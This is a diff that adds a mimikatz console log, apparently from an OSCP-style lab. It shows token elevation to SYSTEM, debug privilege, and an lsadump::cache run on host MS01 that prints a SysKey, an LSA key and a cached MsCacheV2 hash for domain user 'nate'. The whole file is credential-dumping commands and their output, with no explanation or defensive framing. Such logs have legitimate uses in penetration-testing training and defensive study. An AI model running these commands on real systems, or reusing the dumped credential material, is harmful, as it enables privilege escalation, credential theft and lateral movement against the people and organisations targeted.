@@ -1,0 +1,42 @@
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+1176	{0;000003e7} 0 D 76192     	NT AUTHORITY\SYSTEM	S-1-5-18	(15g,28p)	Impersonation (Impersonation)
+ -> Impersonated !
+ * Process Token : {0;00377ba7} 2 F 4410198   	oscp\nate	S-1-5-21-395943061-4281203283-1985023469-1106	(14g,24p)	Primary
+ * Thread Token  : {0;000003e7} 0 D 4451972   	NT AUTHORITY\SYSTEM	S-1-5-18	(15g,28p)	Impersonation (Impersonation)
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # lsadump::cache
+Domain : MS01
+SysKey : c83bd962b8f96d524b9304832b250599
+
+Local name : MS01 ( S-1-5-21-4092024685-235929341-2660346364 )
+Domain name : oscp ( S-1-5-21-395943061-4281203283-1985023469 )
+Domain FQDN : oscp.exam
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {106c48a9-9d90-4d6f-23e9-5d876674fc3d}
+  [00] {106c48a9-9d90-4d6f-23e9-5d876674fc3d} 598ade1f785d522048bc3fd6ccf6f985ad3f2cc75240463aded7d10724a586d4
+
+* Iteration is set to default (10240)
+
+[NL$1 - 5/19/2024 10:38:18 PM]
+RID       : 00000452 (1106)
+User      : oscp\nate
+MsCacheV2 : 3108d20e9f37b7cb8fcc49f3b65205f4
+
+mimikatz(commandline) # exit
+Bye!
